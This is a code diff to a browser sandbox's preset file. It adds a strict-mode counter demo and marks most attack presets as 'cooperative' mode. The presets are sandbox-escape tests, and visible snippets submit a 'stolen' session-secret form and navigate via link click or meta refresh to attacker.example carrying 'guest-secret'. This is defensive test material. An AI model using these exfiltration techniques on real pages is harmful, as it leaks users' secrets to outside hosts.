@@ -13,10 +13,11 @@ import type { SandboxConfigOptions } from "../host";
 import type { StrictSandboxOrigins } from "./csp/origins";
 
 /**
- * A preset's rules: a config every mode can run, since the playground and the specs run a preset in the mode they
- * choose (`{ ...preset.rules, mode }`). So its origins have no `scripts`, which strict mode does not take.
+ * A preset's rules. Each names the mode it was written for, so an attack keeps testing that mode whatever the default
+ * is. A spec may still run a preset in another mode (`{ ...preset.rules, mode }`), so its origins are ones every mode
+ * can take: no `scripts`, which strict mode does not take.
  */
-export type PresetRules = SandboxConfigOptions & { mode?: 'iframe' | 'worker' | 'strict'; origins?: StrictSandboxOrigins };
+export type PresetRules = SandboxConfigOptions & { mode: 'strict' | 'cooperative' | 'worker'; origins?: StrictSandboxOrigins };
 
 export interface Preset {
     id: string;
@@ -41,6 +42,27 @@ export interface Preset {
 const LOGO_SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="40" viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#4338ca"/><text x="60" y="26" font-family="sans-serif" font-size="16" fill="#fff" text-anchor="middle">logo.svg</text></svg>';
 
 export const PRESETS = {
+    "strict-demo": {
+        id: "strict-demo",
+        label: "Strict Mode (the default): a counter",
+        category: "demo",
+        run: "markup",
+        // Strict mode, the default (ADR-005): main.js, the entry, runs in a worker and draws into the view through
+        // sandboxView; the view runs no guest script. `code` is the initial view ("Run as HTML" loads it, and the entry
+        // draws over it). The playground opens on this preset.
+        code: `<main><p>Loading…</p></main>`,
+        files: {
+            "main.js": `let count = 0;
+const draw = () => sandboxView.render(
+  '<main><h1>Strict mode</h1>' +
+  '<p>This code runs in a worker; the view shows what it renders and runs no guest script.</p>' +
+  '<button id="add">Clicked ' + count + ' times</button></main>');
+sandboxView.on('click', 'add', () => { count++; draw(); console.log('clicked', count); });
+draw();
+console.log('strict demo: the entry ran in the worker');`,
+        },
+        rules: { mode: "strict", entry: "main.js", watchdogTimeout: 2000 },
+    },
     "basic": {
         id: "basic",
         label: "Basic Interaction",
@@ -51,6 +73,7 @@ fetch("https://jsonplaceholder.typicode.com/todos/1")
   .then(r => r.json())
   .then(j => console.log("Fetched:", j));`,
         rules: {
+            mode: "cooperative",
             origins: { connect: ["https://jsonplaceholder.typicode.com"] },
             scriptUnsafe: true,
             capabilities: ["allow-scripts"],
@@ -79,7 +102,7 @@ iframe.srcdoc = \`<meta http-equiv="Content-Security-Policy" content="default-sr
 document.body.appendChild(iframe);
 
 setTimeout(() => console.log('TEST_DONE'), 1500);`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "sw-tamper": {
         id: "sw-tamper",
@@ -98,7 +121,7 @@ setTimeout(() => console.log('TEST_DONE'), 1500);`,
     }
     console.log('TEST_DONE');
 })();`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "worker-timeout": {
         id: "worker-timeout",
@@ -139,7 +162,7 @@ try { sandboxFiles.url("../main.js"); } catch (e) { console.log("../main.js:", e
             "data.json": '{ "hello": "from data.json" }',
             "logo.svg": LOGO_SVG,
         },
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "websocket-bypass": {
         id: "websocket-bypass",
@@ -156,7 +179,7 @@ try { sandboxFiles.url("../main.js"); } catch (e) { console.log("../main.js:", e
     console.log('PWN_FAILURE');
 }
 setTimeout(() => console.log('TEST_DONE'), 1000);`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "outer-frame-tampering": {
         id: "outer-frame-tampering",
@@ -173,7 +196,7 @@ setTimeout(() => console.log('TEST_DONE'), 1000);`,
     }
 }
 setTimeout(() => console.log('TEST_DONE'), 100);`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "monkey-patch-bypass": {
         id: "monkey-patch-bypass",
@@ -186,7 +209,7 @@ setTimeout(() => console.log('TEST_DONE'), 100);`,
     .then(() => console.log('PWN_SUCCESS'))
     .catch(() => console.log('PWN_FAILURE'));
 setTimeout(() => console.log('TEST_DONE'), 1000);`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "protocol-handler": {
         id: "protocol-handler",
@@ -201,7 +224,7 @@ setTimeout(() => console.log('TEST_DONE'), 1000);`,
     console.log('PWN_FAILURE: ' + e.message);
 }
 console.log('TEST_DONE');`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "data-uri": {
         id: "data-uri",
@@ -216,7 +239,7 @@ console.log('TEST_DONE');`,
     console.log('PWN_FAILURE: ' + e.message);
 }
 console.log('TEST_DONE');`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "session-exhaustion": {
         id: "session-exhaustion",
@@ -243,7 +266,7 @@ console.log('TEST_DONE');`,
     }
     console.log('TEST_DONE');
 })();`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "base-tag": {
         id: "base-tag",
@@ -265,7 +288,7 @@ console.log('TEST_DONE');`,
     console.log('PWN_FAILURE: ' + e.message);
 }
 setTimeout(() => console.log('TEST_DONE'), 2000);`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "storage-sharing": {
         id: "storage-sharing",
@@ -287,7 +310,7 @@ try {
     console.log('Write Failed: ' + e.name);
 }
 console.log('TEST_DONE');`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
     },
     "alert-test": {
         id: "alert-test",
@@ -299,7 +322,7 @@ console.log('TEST_DONE');`,
         code: `alert("If you see this, alert() is not blocked");
 console.log('ALERT_RETURNED');
 console.log('TEST_DONE');`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts",] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts",] }
     },
     "allow-same-origin": {
         id: "allow-same-origin",
@@ -312,7 +335,7 @@ console.log('TEST_DONE');`,
     console.log('PASS: Origin is opaque. Filter working.');
 }
 console.log('TEST_DONE');`,
-        rules: { capabilities: ["allow-scripts", "allow-same-origin" as SafeCapability], scriptUnsafe: true }
+        rules: { mode: "cooperative", capabilities: ["allow-scripts", "allow-same-origin" as SafeCapability], scriptUnsafe: true }
     },
     "allow-top-nav": {
         id: "allow-top-nav",
@@ -326,7 +349,7 @@ console.log('TEST_DONE');`,
     console.log('PASS: Top navigation blocked (' + e.message + ')');
 }
 console.log('TEST_DONE');`,
-        rules: { capabilities: ["allow-scripts", "allow-top-navigation" as SafeCapability], scriptUnsafe: true }
+        rules: { mode: "cooperative", capabilities: ["allow-scripts", "allow-top-navigation" as SafeCapability], scriptUnsafe: true }
     },
     "allow-popups-escape": {
         id: "allow-popups-escape",
@@ -348,7 +371,7 @@ console.log('TEST_DONE');`,
     }
     console.log('TEST_DONE');
 })();`,
-        rules: { capabilities: ["allow-scripts", "allow-popups-to-escape-sandbox" as SafeCapability], unsafeCapabilities: ["allow-popups"], scriptUnsafe: true }
+        rules: { mode: "cooperative", capabilities: ["allow-scripts", "allow-popups-to-escape-sandbox" as SafeCapability], unsafeCapabilities: ["allow-popups"], scriptUnsafe: true }
     },
     "local-html-page": {
         id: "local-html-page",
@@ -441,6 +464,7 @@ console.log('TEST_DONE');`,
 </body>
 </html>`,
         rules: {
+            mode: "cooperative",
             origins: { images: ["https://picsum.dev"] },
             // scriptUnsafe: true,
             capabilities: ["allow-scripts"],
@@ -464,7 +488,7 @@ console.log('TEST_DONE');`,
             "plaintext": `<plaintext>`,
         },
         // markup runs with allow-scripts; nothing here evaluates strings, so no scriptUnsafe (broad review I2)
-        rules: { capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", capabilities: ["allow-scripts"] }
     },
     "form-action-exfil": {
         id: "form-action-exfil",
@@ -478,7 +502,7 @@ console.log('TEST_DONE');`,
   <input name="stolen" value="session-secret">
 </form>
 <script>document.getElementById('f').submit();</script>`,
-        rules: { capabilities: ["allow-scripts", "allow-forms"] }
+        rules: { mode: "cooperative", capabilities: ["allow-scripts", "allow-forms"] }
     },
     "popup-exfiltration": {
         id: "popup-exfiltration",
@@ -496,7 +520,7 @@ try {
     outcome = 'refused'; // Firefox throws where popups are not allowed; the others return null
 }
 console.log('POPUP ' + outcome);`,
-        rules: { scriptUnsafe: true, capabilities: ["allow-scripts", "allow-popups" as SafeCapability] }
+        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts", "allow-popups" as SafeCapability] }
     },
     "self-navigation": {
         id: "self-navigation",
@@ -512,8 +536,11 @@ console.log('POPUP ' + outcome);`,
             "link click": `<a id="a" href="https://attacker.example/?d=guest-secret">x</a><script>setTimeout(() => document.getElementById('a').click(), 50)</script>`,
             "meta refresh": `<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=guest-secret">`,
         },
-        rules: { capabilities: ["allow-scripts"] }
+        rules: { mode: "cooperative", capabilities: ["allow-scripts"] }
     },
 } satisfies Record<string, Preset>;
 
 export type PresetId = keyof typeof PRESETS;
+
+/** The preset the playground opens on: strict mode, the default. */
+export const DEFAULT_PRESET: PresetId = "strict-demo";
